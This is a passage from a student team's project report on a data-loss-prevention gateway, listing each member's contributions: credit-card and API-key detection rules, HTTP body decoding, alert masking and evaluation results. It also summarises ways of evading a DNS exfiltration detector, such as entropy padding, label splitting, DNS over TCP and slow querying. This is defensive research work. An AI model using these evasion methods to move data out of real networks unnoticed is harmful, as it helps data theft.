- **Adversarial audit:** Audited Sofia’s passive DNS detector (`dns_detector.py`) against diverse evasion vectors, categorizing findings into patchable detection flaws, operational trade-offs, architectural boundaries, and fundamental mathematical limits.
- **Hardening & implemented patches:**
  - *Entropy dilution (PR #4):* Demonstrated that padding high-entropy secrets with repeating characters dropped the average entropy below threshold; patched `extract_features()` to track per-label maximum entropy, raising detection capabilities.
  - *Multi-label slicing (PR #6):* Identified length-rule bypasses using multi-label splitting; implemented a patch introducing sub-label depth tracking (`sub_label_count >= 4`) to eliminate this attack vector.
- **Documented bounds & limitations:** Documented detection limits that cannot be caught by single-packet heuristics: the Shannon entropy ceiling on short strings, multi-query payload splitting, transport bypasses (DNS over TCP/53), and low-and-slow queries evading sliding windows.

#### 4. Documentation, integration & team coordination

- **Report authoring:** Structured the primary `README.md` report, drafting the shared overarching sections *(problem statement, threat model)* as well as the chapters dedicated to my work *(network architecture, ICMP covert detection, DNS evasion hardening, qualitative limits analysis, bounds, and architectural alternatives ; as well as the section you are currently reading)*.
- **Technical guides & demo setup:** Authored detailed standalone reference guides *(`architecture.md`, `icmp-detection-mecanism.md`, and `dns-evasion-hardening.md`)* and initiated `demo_guide.md` to provide a clear walk-through for testing and demo execution.
- **Collaborative QA & governance:** Opened GitHub issues to flag detection blind spots and logic bugs in peer code, authored PRs for patches, and drafted the team's academic AI Use policy (`AI_USE.md`).

### Individual contribution: Jonas

#### 1. L7 Web DLP engine: Credit-card detection (WS B)

- **Luhn checksum implementation:** Wrote the Luhn validator (`luhn_valid` in `detection/l7_web/luhn.py`) following the Wikipedia specification: reverse digits, double at odd indices, subtract 9 above threshold, sum modulo 10.
- **Regex pre-filter design:** Designed the digit-run candidate regex `(?<!\d)(?:\d[ ._-]?){11,18}\d(?!\d)` with negative lookarounds to prevent matches inside longer digit sequences *(tracking numbers, hashes, opaque IDs)*, reducing false positives upstream of Diogo's issuer-prefix stage.
- **Finding emission with offset preservation:** Wired both stages into a `scan()` function returning `Finding` objects with offset-correct `start`/`end` positions, so downstream components can hide or highlight the exact matched substring.

#### 2. L7 Web DLP engine: HTTP payload decoding (WS B)

- **Content-type dispatch (`decode_body`):** Built the body decoder in `detection/l7_web/decoder.py` routing raw request bytes by `Content-Type`: `application/x-www-form-urlencoded` through `parse_qs` to decode percent-escapes *(critical: `%2D` → `-` before Luhn runs)*, `application/json` through `json.loads`, everything else through a UTF-8 fallback.
- **Recursive scalar extraction (`_flatten_scalars`):** Implemented the recursive walker that descends arbitrarily nested JSON structures and returns every scalar as a flat list, surfacing values like `{"user":{"payment":{"cc":"4111-1111-1111-1111"}}}` regardless of nesting depth.
- **Mitmproxy addon integration:** Wired `decode_body` into the gateway addon so every outbound request is decoded before `scan_all()` runs. Closing a detection gap where URL-encoded form payloads previously bypassed the Luhn pre-filter because `mitmproxy.get_text()` does not URL-decode form bodies.

#### 3. Shared L7 pipeline infrastructure & log hygiene (WS B)

- **Core `Finding` contract & `scan_all` aggregator:** Defined the shared `Finding` dataclass and `scan_all` dispatch function in `detection/l7_web/__init__.py`, giving all three L7 detectors and the covert-channel sniffer a uniform output shape.
- **Secret masking (`detection/common/mask.py`):** Caught that `log_alert` was writing full matched substrings into the alert channel (a self-inflicted leak) and added a shared `mask()` helper (first and last 4 chars kept, middle replaced with asterisks) wired through the addon's alert path.

#### 4. Documentation & test suite

- **L7 detection documentation (`docs/l7-web-detection-mechanism.md`):** Authored the standalone technical reference covering the three-stage credit-card pipeline *(regex / Luhn / issuer prefix)*, the body decoder's dispatch and fallback behavior, the entropy infrastructure, and the alerting path through mitmproxy.
- **Initial unit test suite (`tests/test_l7_web.py`) & repository bootstrap:** Wrote the initial pytest suite covering Luhn edge cases, scan integration *(mixed separators, offset correctness, multiple cards)*, decoder behaviour *(nested JSON, URL-encoded multi-values, broken bodies)*, and false-positive protection (the harness Diogo later extended for the issuer-prefix and regex-pattern cases). Also set up the initial package layout *(`detection/`, `attacks/`, `evaluation/`, `tests/`)* before team-wide implementation began.

#### 5. Quantitative L7 evaluation (WS D.2)

- **L7 session evaluation harness (`evaluation/run_l7_eval.py`):** Built the offline harness that pushes 14 malicious and 10 benign hand-crafted sessions through `decode_body` + `scan_all`, times each request with `perf_counter_ns` across 100 iterations, and writes `sessions.csv` / `results.csv` / `REPORT.md` in the same format as the covert-channel evaluation. The corpus covers 6 credit cards, 5 API tokens, 3 of Diogo's evasions, and 10 benign patterns picked to stress the pre-filter, Luhn, and entropy false-positive paths — headline numbers: TPR 85.7%, FPR 0%, median pipeline latency 15 μs.
- **End-to-end latency decomposition:** Timed real `curl` requests through the Docker + mitmproxy stack for three scenarios *(clean, blocked form, blocked JSON)* and combined with the pipeline numbers to show that the detector contributes under 0.5% of the request round-trip, dominated by TLS and container networking.
- **Section 4.1 write-up:** Wrote the L7 subsection of §4.1 (TPR / FPR / latency tables + Level-1 methodology caveat) and extended `evaluation/README.md` to cover L7 alongside DNS and ICMP.

### Individual contribution: Diogo

#### 1. L7 Web DLP engine: Credit-card detection hardening (WS B)

- **Issuer prefix & length validation (`detection/l7_web/luhn.py`):**  
Extended Jonas Luhn validation by checking if each candidate mathed real credit card issuers (from a Wikipedia list). By checking BIN prefix ranges and card number lengths, we were able to reduce false positives that could came, for example, from timestamps that otherwise will be luhn valid. Each issuer also carries a `include_detection` flag that could be used for testing and/or statistics. 
- **Separator & length regex fix (`detection/l7_web/luhn.py`):**
Added more separators to the candidate regex and fixed its length to cover, for example, Maestro cards (that are shorter than usual cards)
- **Test coverage (`tests/test_l7_web.py`)**
Added tests such as: test_luhn_empty(), test_luhn_receives_char(), test_scan_ignores_all_zeros_but_luhn_isvalid(), test_scan_ignores_milisecond_timestamp_but_luhn_isvalid(), test_scan_finds_cc_with_dots(), test_scan_finds_cc_with_underscores(), and others, to guarantee the credit-card detection hardening was well implemented and too proof the changes were relevant.

#### 2. L7 Web DLP engine: Detection pipeline wiring (WS B)
- **Addon.py
[Diogo TODO: COMPLETE]

#### 3. L7 Web DLP engine: API key regex rules (WS B)
- **credential patterns (`detection/l7_web/regex_rules.py`):**
Implemented regex patterns for famous companies such as Amazon (AWS), GitHub, OpenAI, Google Cloud API and Gemini, Stripe, Cloudflare. JWTs were also considered relevant. This patterns were not reused from any licensed detection projects, they were derived from documentation and public format specifications, blogs and other websites mentioned in ...
- **Regex test suite (`tests/test_l7_web.py`):**
Added tests for each regex rule using synthetically generated, structurally valid but never-issued token.

[Diogo TODO: COMPLETE]

### Individual contribution: Sofía
